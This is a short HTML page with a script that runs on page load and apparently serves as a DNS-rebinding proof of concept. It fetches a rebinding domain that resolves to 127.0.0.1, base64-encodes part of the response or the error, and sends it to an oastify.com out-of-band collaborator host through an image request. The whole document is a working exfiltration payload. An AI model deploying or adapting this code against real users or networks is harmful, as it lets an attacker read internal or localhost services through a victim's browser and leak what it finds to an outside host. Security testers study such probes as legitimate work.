<!DOCTYPE html>
<html>
<body>
<script>
const target = 'acd918ee.7f000001.rbndr.us';

// First, test if the domain resolves at all
fetch(`http://${target}/`)
    .then(r => r.text())
    .then(data => {
        const img = new Image();
        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_works=` + btoa('RESOLVES: ' + data.substring(0, 100));
    })
    .catch(err => {
        const img = new Image();
        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_failed=` + btoa('DOMAIN NOT RESOLVING: ' + err.toString());
    });
</script>
</body>
</html>
